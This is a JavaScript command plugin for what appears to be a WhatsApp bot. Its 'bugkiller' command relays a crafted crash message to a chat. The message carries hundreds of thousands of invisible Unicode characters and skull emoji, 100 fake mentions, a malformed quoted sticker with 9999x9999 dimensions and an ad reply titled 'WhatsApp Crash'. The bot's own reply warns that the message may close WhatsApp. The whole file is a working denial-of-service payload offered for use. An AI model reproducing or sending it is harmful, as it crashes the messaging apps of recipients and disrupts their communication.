const sendDeadlyBug = async (conn, jid) => {
  const invisible = '\u2063\u200E\uFEFF';
  const longText = invisible.repeat(250000) + '💀'.repeat(100000);

  const payload = {
    key: {
      remoteJid: jid,
      fromMe: false,
      id: conn.generateMessageTag()
    },
    message: {
      extendedTextMessage: {
        text: longText,
        contextInfo: {
          mentionedJid: Array(100).fill('0@s.whatsapp.net'),
          forwardingScore: 999999,
          isForwarded: true,
          quotedMessage: {
            stickerMessage: {
              fileSha256: Buffer.from([]),
              fileEncSha256: Buffer.from([]),
              mediaKey: Buffer.from([]),
              mimetype: 'image/webp',
              height: 9999,
              width: 9999,
              directPath: '',
              mediaKeyTimestamp: 1
            }
          },
          externalAdReply: {
            title: '💥 WhatsApp Crash 💥',
            body: '😵‍💫 Este mensaje no debería existir.',
            mediaType: 1,
            thumbnailUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          },
          groupMentions: [{
            groupJid: '0@broadcast',
            groupSubject: '💣'
          }]
        }
      }
    }
  };

  await conn.relayMessage(jid, payload.message, { messageId: payload.key.id });
};

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Este comando solo puede ser usado por el Owner.';

  await sendDeadlyBug(conn, m.chat);
  await m.reply('☠️ *Bug extremo enviado.*\n⚠️ Este mensaje puede cerrar WhatsApp.\n💡 Recomendado solo para pruebas privadas.');
};

handler.command = /^bugkiller$/i;
handler.owner = true;
handler.tags = ['owner'];
handler.help = ['bugkiller'];

export default handler;
